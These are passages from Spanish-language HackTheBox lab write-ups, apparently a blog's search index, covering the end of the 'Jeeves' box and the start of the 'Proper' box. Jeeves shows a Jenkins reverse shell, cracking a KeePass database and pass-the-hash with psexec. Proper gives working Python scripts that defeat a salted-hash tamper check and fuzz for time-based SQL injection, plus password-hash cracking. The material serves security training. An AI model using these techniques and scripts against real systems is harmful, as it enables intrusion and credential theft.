Jenkins (que esta en una de las carpetas del usuario Administrator). üöÜ Script Console: √âl mismo nos informa que podemos escribir ah√≠:  Type in an arbitrary Groovy script and execute it on the server. Jugamos con scripts de Groovy para ejecutar comandos en el sistema üìå: ‚õ∞Ô∏è Groovy es un lenguaje de programaci√≥n orientado a objetos implementado sobre la plataforma Java. Groovy usa una sintaxis muy parecida a Java, comparte el mismo modelo de objetos, de hilos y de seguridad. Wikipedia. Buscando como usar la consola o ejemplos del lenguaje Groovy, encontramos este recurso:  Exploiting Jenkins Groovy Script Console in Multiple Ways. El post nos provee directamente un payload para obtener una Reverse Shell, lo extrae de este otro recurso:  https://gist. github. com/frohoff/fed1ffaab9b9beeb1c76. Antes de intentarlo quer√≠a mostrarles este otro c√≥digo, con √©l podemos ejecutar comandos en el sistema y ver su respuesta:  https://gist. github. com/katta/5465317. Prob√©moslo pero con el comando whoami a vel: Liiiistooones, el usuario que esta ejecutando el servicio Jenkins se llama kohsuke yyyy ya tendr√≠amos ejecuci√≥n remota de comandos (: Ese ejemplo me gusto porque es muy sencillo de interpretar. Ahora si intentemos generar la Reverse Shell. Nos ponemos en escucha por el puerto en el que queremos recibirla, en mi caso en el 4433: ‚ù± nc -lvp 4433Y ahora en la consola de scripts ejecutar√≠amos: Le indicamos que nos env√≠e una petici√≥n hacia nuestro puerto 4433 y que cuando la establezca nos ejecute una cmd. exe (terminal). Damos clic en Run yyyyyyyyyyy: TAMOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO!! Conseguimos la reverse Shell como el usuario kohsuke y estamos en el sistema (: ‚Ä¶ Con este script logramos una Shell en la misma ejecuci√≥n del programa:  jenkins_pwn_shell. py Intentamos desencriptar los secretos de Jenkins üìå: Nuestra primera impresi√≥n al ejecutar dir es ver muuuuuuuucho archivos, uno con un nombre llamativo (secret. key) que me hizo volver a un recurso que hab√≠a desechado:  https://github. com/gquere/pwn_jenkins. Habla de los ü§´ secretos de Jenkins üò∂ y lo necesario para desencriptarlos, que serian dos archivos:  secrets/master. key.  secrets/hudson. util. Secret. Peeero si bajamos un poquito m√°s vemos que podemos intentar desencriptarlos con el propio Groovy y sus comandos, pues aprovechemos la consola que tenemos para interactuar con eso‚Ä¶ Simplemente debemos pasarle el secreto: println(hudson. util. Secret. decrypt( {. . . } ))Leyendo ac√° entendemos el porqu√© hay unos {} en el ejemplo de arriba, ellos hacen parte del secreto, por lo que en caso de encontrar alg√∫n secreto para lograr desencriptarlo debemos agregar los {} tambi√©n‚Ä¶ Enumerando las carpetas vemos el archivo config. xml en la ruta . . \Administrator\. jenkins\\users\admin; en su contenido hay un token entre {}: Pues probemos la dezencryptazhion: Nos devuelve un hash y ese ser√≠a la flag que va en root. txt (: Y iaaaaaaaaa, eso es todo por esta m√°quina, veamos la flag del user. txt: E. E noup, ese hash debe ser el token del API en texto plano, pero ¬ønos sirve esto para algo? Por ahora no (no creo que sirva tampoco despu√©s), pero aprendimos e. e ‚Ä¶ Escalada de privilegios #Enumerando las carpetas de kohsuke encontramos una base de datos de contrase√±as en Documents: Por si no conoces los archivos . kdbx: üîê Un objeto con la extensi√≥n . kdbx es un archivo KeePass Password Database, la finalidad de estos archivos es almacenar y proteger un grupo de contrase√±as de manera segura. Para acceder a la base de datos se necesita una contrase√±a -madre- o -maestra- que es la encargada de securizar toooooodas las dem√°s contrase√±as. M√°s info KeePass y . kdbx:  KeePass.  Opening KDBX Files. ‚Ä¶ Jugamos con el archivo . kdbx y obtenemos master password üìå: Existe una herramienta llamada kpcli con la cual podemos jugar para interactuar con la base de datos, pero primero pas√©monos el archivo a nuestro sistema: c:\\Users\kohsuke\Documents&gt;copy CEH. kdbx \\10. 10. 14. 2\smbFolder\CEH. kdbx‚ù± file CEH. kdbx CEH. kdbx: Keepass password database 2. x KDBXEsta este excelente tutorial del que nos guiaremos para leer la base de datos:  How To Use kpcli To Manage KeePass2 Password Files. Ejecutamos la herramienta y le indicamos que vamos a usar el archivo . kdbx: ‚ù± kpcli kpcli:/&gt; open CEH. kdbx Please provide the master password:Jmmmm, lo que hab√≠amos dicho antes, por lo general es necesaria una password maestra‚Ä¶ Al colocar cualquier cosa obtenemos:  Couldn‚Äôt load the file CEH. kdbx: The database key appears invalid or else the database is corrupt. F, F, F‚Ä¶ Dando algunas vueltas encontramos este recurso:  Cracking KeePass Database. En √©l se usa la herramienta keepass2john la cual obtiene un hash que hace referencia a la master password, depende de que tan fuerte sea para evitar ser crackeada (: As√≠√≠√≠√≠√≠√≠ que obtengamos el hash e intentemos crackearlo: ‚ù± keepass2john CEH. kdbxCEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48Peeerfecto, guard√©moslo en un archivo: ‚ù± keepass2john CEH. kdbx &gt; CEH. txtY ahora simplemente se lo pasamos a John The Ripper (que es un crackeador de contrase√±as): ‚ù± john --wordlist=/usr/share/wordlists/rockyou. txt CEH. txt Using default input encoding: UTF-8Loaded 1 password hash (KeePass [SHA256 AES 32/64])Cost 1 (iteration count) is 6000 for all loaded hashesCost 2 (version) is 2 for all loaded hashesCost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashesPress 'q' or Ctrl-C to abort, almost any other key for statusmoonshine1    (CEH)1g 0:00:01:09 DONE (2021-08-17 19:32) 0. 01443g/s 793. 5p/s 793. 5c/s 793. 5C/s moonshine1Use the  --show  option to display all of the cracked passwords reliablySession completed¬øKHE ZE BE POR AY? Tenemos la master password en texto planooooooooooooooooo. Pos volvamos a cargar la base de datos y le pasamos esa pw: Ahora s√≠√≠√≠√≠√≠√≠√≠√≠, pos retomemos el tutorial de antes y exploremos‚Ä¶ Vemos credenciales del gestor KeePass üìå: Como bien dice el post, la interacci√≥n es muy parecida a la de los comandos *nix, pero claramente no opera sobre el sistema sino sobre la estructura que tiene la base de datos: kpcli:/&gt; ls=== Groups ===CEH/Existe un grupo (que ser√≠a un apartado para organizar las distintas contrase√±as), entremos en √©l: kpcli:/&gt; cd CEH/kpcli:/CEH&gt; ls=== Groups ===eMail/General/Homebanking/Internet/Network/Windows/=== Entries ===0. Backup stuff                              1. Bank of America                  www. bankofamerica. com2. DC Recovery PW                             3. EC-Council                www. eccouncil. org/programs/cer4. It's a secret                 localhost:8180/secret. jsp5. Jenkins admin                      localhost:80806. Keys to the kingdom                          7. Walmart. com                       www. walmart. comVemos tambi√©n algunos grupos, pero lo nuevo son las -entradas-, que serian las contrase√±as que hay guardadas. Tenemos la descripci√≥n del usuario y el sitio al que pertenece esa credencial (hay dos bastante curiosas que hacen referencia a servicios locales (pero que no existen en el sistema :P)), por ejemplo si inspeccionamos la password del banco de america tendr√≠amos esta estructura:  Podemos ya sea llamar el index de cada uno (0,1,2,3‚Ä¶) o su nombre (Bank of America, EC-Council‚Ä¶) kpcli:/CEH&gt; show 1 La barra roja evita mostrar la contrase√±a a los ojitos, pero si copiamos el contenido y lo pegamos en cualquier otro sitio, vamos a ver la contrase√±a. Despu√©s de jugar con todas las entradas obtenemos: Obtenemos terminal usando hashes y psexec. py üìå: Hay algunas contrase√±as mooooooy llamativas, pero lo que m√°s me llamo la atenci√≥n fue la contrase√±a del index 0, me record√≥ a cuando se dumpea la SAM (archivo que contiene las contrase√±as de los usuarios del sistema), ya que tienen el mismo formato, adjunto prueba e. e  Tomada de packtpub - dumping-the-contents-of-the-sam-database. Si nos fijamos es igualito, si a nuestra credencial le agregamos al inicio un nombre de usuario queda igual, as√≠ que pueda que tengamos un hash de la SAM. Lo bueno de tener esto es que podemos usarlas como -contrase√±as- (: Usemos psexec (herramienta para acceder remotamente a un host) para probar el ingreso con los hashes: ‚ù± psexec. py Jeeves/Administrator@10. 10. 10. 63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00Le pasamos el hostname (Jeeves), el usuario (inicialmente probamos con Administrator) el host y finalmente los hashes, ejecutamos yyyyyyyyy: LKA√ë√ë√ë√ë√ësdf√±l√±√ësjdflkasjdflkajsoiJAODIafjsid VAMOOOOOOOOOOO!! Tamos en el sistema como el usuario nt authority\system. Extraemos la flag root. txt de un ADS üìåVeamos las flags:  Pos no, a√∫n no vamos a ver flags ¬Ø\(„ÉÑ)/¬Ø, tenemos que buscar el objeto root. txt‚Ä¶ Nos indica que -veamos profundamente-, jmmm. Lo primero que se ocurri√≥ fue que podr√≠a estar oculto en alguna ruta del sistema pero neeeeeeelson: c:\&gt;powershell -c Get-ChildItem -Path C:\ -Filter root. txt -Recurse -ErrorAction SilentlyContinue -ForceLo siguiente que iba a hacer era complicarme con ese . lnk extra√±o del directorio Desktop, peeeeeeeeero al momento pens√© en intentar buscar archivos ocultos pero dentro de los mismos archivos existentes :o lo tambi√©n llamado Alternate Data Stream, que seria ocultar informaci√≥n dentro de archivos. Les dejo un art√≠culo que hice en su tiempo profundizando a tope en los ADS:  Ocultando data en archivos de Windows (con ADS). Podemos probar inicialmente con dir /r: üëÅÔ∏è‚Äçüó®Ô∏è Display alternate data streams of the file. docs. microsoft. A veeeeeeeeeer: OJOOOOO, existe un archivo oculto dentro de hm. txt llamado root. txt, o sea, la flag (: pues veamos su contenido: Usaremos el comando more para revelar el contenido del ADS, de manera normal: Y ahora referenciando el ADS: Ya tendr√≠amos las flags de la m√°quina (: Y finaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaal :^D ‚Ä¶ Bonita m√°quina, primer acercamiento contra un servidor Jenkins y todas sus locuras. El tema de KeePass me gusto bastante tambi√©n. El ADS no me exploto la cabeza porque ya los conoc√≠a, pero son muy lindos jajaj. Meno, nos leeremos otro d√≠a, que est√©s bien y como siempre, a seguir rompiendo de tooooooooooooodo!! "
    }, {
    "id": 22,
    "url": "http://localhost:4000/htb/proper",
    "title": "HackTheBox - Proper",
    "body": "2021/08/21 - M√°quina Windows nivel dif√≠cil. Agregamos sal a nuestra inyecci√≥n SQL, jugaremos a ganar la race condition y finalmente entre reversing, movimiento lateral, creaci√≥n de scripts en PowerShell y pipes conseguiremos leer archivos del sistema (: TL;DR (Spanish writeup): Creada por: xct &amp; jkr. Manualidades, manual, manos. Encontraremos √∫nicamente un servidor web en esta m√°quina, tendremos que jugar mucho (mucho) y leer mucho (ac√° tambi√©n :P), me divert√≠ bastante escribiendo este writeup, perd√≥n lo largo (: Empezaremos jugando con una URL que tiene dos par√°metros, en la que encontraremos un SQL injection en uno de ellos‚Ä¶ Pero para jugar correctamente con √©l, debemos usar un salt (que encontramos causando errores en las consultas web) para darle el formato correcto a las peticiones, esto para evitar un errorsito. Encontraremos credenciales v√°lidas contra un apartado del servidor web llamado /licenses. Jugando con √©l y unos themes que nos presenta el sitio web, vamos a encontrar un Remote File Inclusion, nos aprovecharemos de esa vuln para mediante un race condition sobreescribir el contenido de un theme por c√≥digo PHP ü§≠. Con esto en mente lograremos una sesi√≥n en la m√°quina como el usuario web. Estando dentro encontraremos un directorio llamativo (ya que no es nativo del sistema) en la ruta C:\Program Files\Cleaner, que contiene dos binarios, server. exe y client. exe, jugando (muuuuuuuucho) con ellos veremos un proceso que borra y restaura archivos del sistema, lo curioso es que en la mitad del proceso genera una copia del archivo borrado y lo encripta, usaremos ese archivo para seguir jugando y finalmente restaurarlo‚Ä¶ Suena f√°cil (pensarlo tambi√©n) pero jmm, varias cositas para jugar‚Ä¶ Con esto podremos ver el contenido de cualquier objeto del sistema. Pero hasta ahora no s√© (y a los que he preguntado) como obtener una Shell en la m√°quina como el usuario Administrator, as√≠ que por ahora solo podemos leer archivos del sistema. ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita: Bastaaaaante juego de nuestras manitas y muuuuy realista :)  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice. ‚Ä¶ Que las luces fluyan.  Reconocimiento.      Descubrimos puertos abiertos con nmap.     Enumeraci√≥n.      Investigamos el servidor web sobre el puerto 80.     Explotaci√≥n: jugamos con los par√°metros de la web.      Entendiendo como viajan las peticiones para evitar el error al modificar alguna variable.    Encontramos inyecci√≥n SQL time-based jugando con la web.    Validamos credenciales encontradas con la inyecci√≥n SQL contra un panel login.    Estudiamos posible Remote File Inclusion en la web.    Confirmando Remote File Inclusion en apartado web.    Intentamos Race Condition para sobreescribir archivo con c√≥digo PHP.     Escalada de privilegios.      Hacemos an√°lisis din√°mico contra los binarios del proceso Cleanup.    Interactuamos con el pipe que usa el servicio Cleanup.    Usando IO Ninja para ver procesos del pipe (gracias 4st1nus).    Viendo el contenido de cualquier archivo del sistema.    ‚Ä¶ Reconocimiento #‚Ä¶ Enumeraci√≥n de puertos con nmap üìå: Inicialmente haremos un escaneo de puertos para saber que servicios est√°n ejecut√°ndose: ‚ù≠ nmap -p- --open -v 10. 10. 10. 231 -oG initScan       Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535.        ‚Äìopen   Solo los puertos que est√°n abiertos.        -v   Permite ver en consola lo que va encontrando.        -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard.    Obtenemos: ‚ù≠ cat initScan # Nmap 7. 80 scan initiated Thu Mar 18 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 231# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 231 ()  Status: UpHost: 10. 10. 10. 231 ()  Ports: 80/open/tcp//http/// Ignored State: filtered (65534)# Nmap done at Thu Mar 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 225. 78 secondsWow, curiosamente solo tenemos el puerto 80 abierto‚Ä¶       Puerto   Descripci√≥n         80   HTTP: Servidor web.    Hagamos el escaneo basado en script y versiones, en este caso en el puerto 80 simplemente: ‚ù≠ nmap -p 80 -sC -sV 10. 10. 10. 231 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚ù≠ cat portScan # Nmap 7. 80 scan initiated Thu Mar 18 25:25:25 2021 as: nmap -p 80 -sC -sV -oN portScan 10. 10. 10. 231Nmap scan report for 10. 10. 10. 231Host is up (0. 12s latency). PORT  STATE SERVICE VERSION80/tcp open http  Microsoft IIS httpd 10. 0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10. 0|_http-title: OS Tidy Inc. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Thu Mar 18 25:25:25 2021 -- 1 IP address (1 host up) scanned in 15. 45 secondsObtenemos:       Puerto   Servicio   Versi√≥n         80   HTTP   Microsoft IIS httpd 10. 0   Empecemos a escarbar el servicio‚Ä¶ ‚Ä¶ Enumeraci√≥n #‚Ä¶ Puerto 80 üìå: Encontramos una bienvenida de varias im√°genes y algo de data, pero nada interesante. Revisando el c√≥digo fuente, tenemos una referencia a una URL y una petici√≥n: . . . &lt;script type= text/javascript &gt;  $(document). ready(function(){    'use strict';    jQuery('#headerwrap'). backstretch([  assets/img/bg/bg1. jpg ,  assets/img/bg/bg3. jpg  ], {duration: 8000, fade: 500});    $(  #product-content  ). load( /products-ajax. php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b ,function() {});  });&lt;/script&gt;. . . Lo emplea para armar un apartado de la bienvenida: (tiene un aspecto a que podemos jugar con inyecciones, pero primero veamos lo que renderiza con la URL) Interceptando la petici√≥n con Burp e intentando modificar alguno de los par√°metros, tenemos: (Agregue proper. htb al /etc/hosts para que resuelva contra la IP, por si alguno se pierde al ver el dominio ah√≠. ) Original: Modificada: Jmmm, nos detecta que hemos intentado modificar la petici√≥n y nos salta una advertencia. Salta siempre el mismo error si intentamos modificar cualquier variable‚Ä¶ Siento que por ac√° deben ser los tiros pero por el momento no s√© que intentar‚Ä¶ Hagamos un escaneo de rutas a ver si encontramos algo: ‚ù≠ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/raft-small-directories. txt -u http://10. 10. 10. 231/FUZZ. . . =====================================================================ID      Response  Lines  Word    Chars    Payload   =====================================================================000000084:  301    1 L   10 W    150 Ch    assets  000000765:  301    1 L   10 W    150 Ch    Assets 000004182:  301    1 L   10 W    152 Ch    licenses Si validamos las rutas en la web, obtenemos info en /licenses: Un panel login, debemos logearnos con una direcci√≥n de correo (que podemos intuir que sea usuario@proper. htb). Pero probando cositas no logramos nada‚Ä¶ Haciendo un fuzz sobre /assets encontramos la ruta /api, pero no tenemos acceso a su contenido: ‚ù≠ wfuzz --hc=404,500 -L -c -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories. txt http://10. 10. 10. 231/assets/FUZZ. . . =====================================================================ID      Response  Lines  Word    Chars    Payload   =====================================================================000000009:  403    29 L   92 W    1233 Ch    js 000000015:  403    29 L   92 W    1233 Ch    css 000000045:  403    29 L   92 W    1233 Ch    img 000000078:  403    29 L   92 W    1233 Ch    api ‚Ä¶ Explotaci√≥n #Jmmm, tenemos un login panel y un archivo que hace consultas para extraer productos‚Ä¶ Podemos pensar que debemos hacer alg√∫n tipo de SQ, pero primero debemos bypassear el WAF (Firewall Web) que nos detecta si cambiamos la consulta, despu√©s de un rato jugando con BurpSuite` vemos un error interesante al quitar uno de los par√°metros:  Vemos la ruta donde est√°n servidos los archivos del sitio: C:\inetpub\wwwroot\.  Tenemos un salt (conjunto de bits aleatorios que se le agregan a un hash, sea al principio o al final, no lo sabemos) INFO Salt.  Vemos dos archivos que pueden ser interesantes en alg√∫n caso, por si encontramos alg√∫n LFI ya sabemos como se llama el archivo de configuraci√≥n de la base de datos‚Ä¶Despu√©s de muchas pruebas ):) y estar super perdido, jugamos con el salt y un fuzzeito guapet√≥n de payloads, pero antes de jugar, veamos el formato necesario para evitar el error ‚ÄúForbidden - Tampering attempt detected‚Äù al modificar las variables: Evitando error Tampering attempt detected üìå: Esta es la petici√≥n original: http://10. 10. 10. 231/products-ajax. php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26bVamos a entender como esta gener√°ndose el hash y revisamos como viaja la data.  How to hash passwords in Python.  Hashing passwords in Python. ‚ù≠ python3 &gt;&gt;&gt; import requests&gt;&gt;&gt; import hashlib&gt;&gt;&gt; &gt;&gt;&gt; url =  http://proper. htb/products-ajax. php &gt;&gt;&gt; salt =  hie0shah6ooNoim # En la consulta sale con un  + , pero es debido al URL encode que se hace en la peticion (el + es un espacio ah√≠)&gt;&gt;&gt; payload =  id desc  Bien, tenemos las variables necesarias para empezar a jugar, el valor de h podemos intuir que es el resultado del payload pero obteniendo su hash en md5: &gt;&gt;&gt; hashh = hashlib. md5(payload. encode('utf-8')). hexdigest()&gt;&gt;&gt; print( Payload:   + payload +   --&gt;   +  Hash:   + hashh)Payload: id desc --&gt; Hash: aa5a97b10a6dd87160868d2316ab2425Listo, obtenemos el hash md5 de la cadena id desc, pero no es el mismo que el de la consulta original, por lo tanto si hacemos una validaci√≥n ante la web, vemos el error: &gt;&gt;&gt; session = requests. Session()&gt;&gt;&gt; r = session. get(url, params={ order :payload,  h :hashh})&gt;&gt;&gt; print(r. text)Forbidden - Tampering attempt detected. Ac√° entra en juego la variable salt, mov√°mosla por todos lados a ver en que momento (si es que llega ese momento) nos deja de mostrar el error en la respuesta: üï¥Ô∏è Despu√©s de un rato‚Ä¶ &gt;&gt;&gt; hashh = hashlib. md5(payload. encode('utf-8') + salt. encode('utf-8')). hexdigest()&gt;&gt;&gt; print( Payload + Salt:   + payload +   +   + salt +   --&gt;   +  Hash:   + hashh)Payload + Salt: id desc + hie0shah6ooNoim --&gt; Hash: 453d803378d6fb7eaf6a3cab618106d6&gt;&gt;&gt; r = session. get(url, params={ order :payload,  h :hashh})&gt;&gt;&gt; print(r. text)Forbidden - Tampering attempt detected. &gt;&gt;&gt; hashh = hashlib. md5(salt. encode('utf-8') + payload. encode('utf-8')). hexdigest()&gt;&gt;&gt; print( Salt + Payload:   + salt +   +   + payload +   --&gt;   +  Hash:   + hashh)Salt + Payload: hie0shah6ooNoim + id desc --&gt; Hash: a1b30d31d344a5a4e41e8496ccbdd26b&gt;&gt;&gt; r = session. get(url, params={ order :payload,  h :hashh})&gt;&gt;&gt; print(r. text)&lt;div class= row &gt;&lt;div class= col-md-4 &gt;. . . OJOOOOOOOOOOOOOo, en el hash vemos el mismo valor que en la consulta original y al ver la respuesta de la petici√≥n tenemos la cabecera HTML de la web (: As√≠ que ya sabemos como se genera el hash y como viaja la data para no obtener el errooooooooooooooooooooor üåª Encontramos SQLi time-based en la web üìå: Creemos el script para leer de un archivo llamado sqlIgeneric. txt algunos payloads (de esta lista), enviarlos a la web y ver que pasa :P #!/usr/bin/python3import requests, hashlibimport signalfrom pwn import *# Ctrl + Cdef def_handler(sig, frame):  print( \nInterrupci√≥n, saliendo. . . \n )  exit(1)signal. signal(signal. SIGINT, def_handler)# Variablesurl =  http://proper. htb/products-ajax. php salt =  hie0shah6ooNoim file_sqli = open('. /sqlIgeneric. txt', 'r')sqli_payloads = []p1 = log. progress( paYl0Ad )for pos, line_sqli in enumerate(file_sqli): # Recorremos el archivo  payload = line_sqli. strip()  hashh = hashlib. md5(salt. encode('utf-8') + payload. encode('utf-8')). hexdigest()  p1. status(payload)  data_get = { order :payload,  h :hashh}  # Si se demora 3 segundos respondiendonos potencialmente existe una inyecci√≥n sql basada en tiempo.   try:    r = requests. get(url, params=data_get, timeout=3)    # O si no hay error en la web tambien puede ser interesante.     if r. status_code != 500:       sqli_payloads. append(payload)  except requests. exceptions. Timeout:    sqli_payloads. append(payload)p1. success( FINAAAAAAAAAAAAAAAAAL.  )if sqli_payloads:  print( [+] Estos payloads generaron algo distinto en la respuesta de la web.  )  total_payloads = '\n'. join(sqli_payloads) # Tomamos cada valor del array y lo imprimimos en una nueva linea.   print(total_payloads)else:  print( [-] Nada a√∫n. . .  )file_sqli. close()Validamos si la p√°gina nos devuelve un c√≥digo distinto a Internal Error (500) y si alg√∫n payload (de los que est√°n basados en tiempo) hace que la petici√≥n se demore. El diccionario es una colecci√≥n de varios repos, logramos extraer m√°s de 2000 payloads (l√≠neas):  https://github. com/payloadbox/sql-injection-payload-list.  https://github. com/OWASP/payloads-sql-blind. Ejecut√°ndolo vemos esto: OPAAA, hay varios payloads que en su interacci√≥n generaron algo distinto a lo normal. PEEEEEEEEEEEERO ¬øqu√© es lo llamativo? ¬ølo sabes ya? EXACTOOOOOOO!! Todas tienen que ver con una inyecci√≥n SQL basada en tiempooooooooooooooo. üßø Una inyecci√≥n SQL basada en tiempo b√°sicamente es ejecutar alguna sentencia que al dar resultado (exitoso) genera un -delay- en el lado del servidor. Si ese -delay- existe (causado por nosotros) sabemos que existe un SQLi time-based. Para confirmar que tenemos ese tipo de inyecci√≥n podemos hacer esto: . . . for i in range(1,11):  payload = f IF(6={i},sleep(5),0)#   hashh = hashlib. md5(salt. encode('utf-8') + payload. encode('utf-8')). hexdigest()  data_get = { order :payload,  h :hashh}  try:    r = requests. get(url, params=data_get, timeout=3)    print( Nada:   + payload)  except requests. exceptions. Timeout:    print( -------&gt; Ac√°:   + payload)Le pasamos el payload IF(6=N,sleep(5),0)# (este es v√°lido en MySQL, en caso de no servir deber√≠amos probar lo mismo pero con la sintaxis de los otros gestores de DBs) que le indica:  Si N numero es igual a 6, haz que la web se demore 5 segundos en responder, de lo contrario sigue‚Ä¶ Si existe el delay en la respuesta, confirmamos la inyecci√≥n. Y si lo probamos: LIIIIIIIIIIIISTOOOOOOOOONES, tenemos SQLi time-based (y sabemos que estamos ante un MySQL). Pues explot√©moslo y veamos toooooooooda la info de las bases de datos (: ‚Ä¶ Extraemos las bases de datos existentes ü™ì:  dbs. py Ejecut√°ndolo vemos solo 3 bases de datos y dos llamativas, cleaner y test, veamos las tablas de cleaner‚Ä¶ Extraemos las tablas de la base de datos cleaner ü™ì:  tables. py Bien, tambi√©n hay varias tablas, veamos la de los clientes primero‚Ä¶ Extraemos las columnas de la tabla customers ü™ì:  columns. py Ahora intentemos dumpear los campos principales, el id, el usuario (login) y su password. Extraemos informaci√≥n de las columnas ü™ì:  info. py Con el script podemos indicarle varios campos, por ejemplo id y login separados por comas (,), y nos devolver√≠a el resultado de cada uno pero separado por -: Bien, hay varios usuarios (no dumpeo todo porque nos echamos ac√° la vida entera :P, pero los hay) y tenemos unos correos‚Ä¶ Caemos en cuenta del recurso que encontramos antes en nuestra enumeraci√≥n, /licenses, nos mostraba un panel login que ped√≠a exactamente eso, un mail. Pero claro, nos falta la contrase√±a, pues extraigamos las dos primeras a ver si podemos hacer algo con ellas: Si nos fijamos la contrase√±a siempre tiene el formato de ser un hash MD5: ‚õ∑Ô∏è La codificaci√≥n del MD5 de 128 bits es representada t√≠picamente como un n√∫mero de 32 s√≠mbolos hexadecimales. Wikipedia  Toma de la a a la f, de la A a la F y del 0 al 9. Por lo que para agilizar la extracci√≥n podemos pasarle √∫nicamente s√≠mbolos hexadecimales como diccionario: . . . dic = string. hexdigits +  -¬£ . . . Y volvemos a ejecutar‚Ä¶ Mientras el script corre podemos jugar con los dos hashes de antes, probablemente sean crackeables, intent√©moslo. Los guardamos en un archivo junto a su usuario (o no, como quieran): ‚ù± cat hashes vikki. solomon@throwaway. mail:7c6a180b36896a0a8c02787eeafb0e4cnstone@trashbin. mail:6cb75f652a9b52798eb6cf2201057c73Ahora usamos John The Ripper y el diccionario rockyou. txt para intentar crackearlas: ‚ù± john --wordlist=/usr/share/wordlists/rockyou. txt hashes --format=Raw-MD5Y en menos de un segundo vemos esto: Using default input encoding: UTF-8Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])Press 'q' or Ctrl-C to abort, almost any other key for statuspassword1    (vikki. solomon@throwaway. mail)password2    (nstone@trashbin. mail)2g 0:00:00:00 DONE (2021-03-18 25:25) 11. 76g/s 6776p/s 6776c/s 9035C/s football1. . summer1Use the  --show --format=Raw-MD5  options to display all of the cracked passwords reliablySession completedExisten similitudes con los hashes para los dos usuarios (: YYYYYYYYYYYYY tenemos dos contrase√±as para probar en el login panel. Validamos credenciales en el login de /licenses üìå: Listo, ahora que tenemos credenciales podemos probar ante el login panel en /licenses y ver si conseguimos entrar, probemos con el primer usuario:  vikki. solomon@throwaway. mail -&gt; password1 VAMONOOOOOOOOOOOOOOOOOOOOOOOOOOOS, tenemos acceso al login panel. Vemos los productos del usuario, as√≠ que suponemos que cada usuario puede tener m√°s o menos productos (de los productos que vimos al inicio).  Ya podemos dejar de descubrir hashes con nuestro script :P Tambi√©n en el header tenemos 3 links que hacen que nuestro ‚Äútheme‚Äù o estilo de la web cambie‚Ä¶ Dando vueltas buscando vulnerabilidades con alguno de los ‚Äúthemes‚Äù y volviendo a leer algunos otros a ver si era que se me hab√≠a pasado alguno en el que fuera necesario estar autenticado para poder ser explotado no encontr√© nada √∫til‚Ä¶ Despu√©s de un rato pens√© en hacer un script que actuara como fuzzer a ver si encontr√°bamos otros ‚Äúthemes‚Äù, para que tomara cada directorio o archivo y lo concatenara con la salt y hacer el mismo proceso de antes, enviar el payload con su respectivo hash. Pero en su ejecuci√≥n final terminamos encontrando algo mejor: #!/usr/bin/python3import requestsimport hashlibimport signal# Ctrl + Cdef def_handler(sig, frame):  print( \nCancelado por el usuario, saliendo. . . \n )  exit(1)signal. signal(signal. SIGINT, def_handler)# Proceso login y fuzzurl =  http://proper. htb/licenses def fuzzing(session):  salt =  hie0shah6ooNoim   with open('/opt/SecLists/Discovery/Web-Content/raft-small-directories. txt', 'r') as wordlist:    for line in wordlist:      # Quitamos espacios finales de la cadena      payload = line. rstrip( \n )      # Generamos hash: md5(salt+payload)      hashh = hashlib. md5(salt. encode('utf-8') + payload. encode('utf-8')). hexdigest()      cookie = session. cookies. get_dict()      parameters =  ?theme=  + payload +  &amp;h=  + hashh      r = session. get(url +  /licenses. php  + parameters, cookies=cookie)      print( \n[+] \ Theme\ : %s -&gt; %s  % (payload, parameters))      print(r. text)def login():  session = requests. Session()  data_post = {     username  :  vikki. solomon@throwaway. mail ,     password  :  password1   }  r = session. post(url +  /index. php , data=data_post)  fuzzing(session)if __name__ == '__main__':  login()(QUE JESO ‚Üë) Lo que estamos haciendo es sencillo, resumidamente por si te perdiste:  Primero iniciamos sesi√≥n para poder hacer peticiones a la ruta /licenses. php con la sesi√≥n de vikki.  Tomamos cada l√≠nea del wordlist y lo concatenamos con la salt (como antes).  Y simplemente hacemos la petici√≥n, donde los par√°metros son: theme=&lt;linea&gt; y h=&lt;hash&gt;. As√≠ que por ejemplo, llega la l√≠nea hola: &gt;&gt;&gt; import hashlib&gt;&gt;&gt; salt =  hie0shah6ooNoim &gt;&gt;&gt; payload =  hola &gt;&gt;&gt; hash = hashlib. md5(salt. encode() + payload. encode()). hexdigest()&gt;&gt;&gt; print( MD5(%s + %s) = Hash: %s  % (salt, payload, hash))MD5(hie0shah6ooNoim + hola) = Hash: 5557007e63c9d95d45ca15a39ff4a5d6&gt;&gt;&gt; Entonces finalmente la consulta que har√≠a seria: 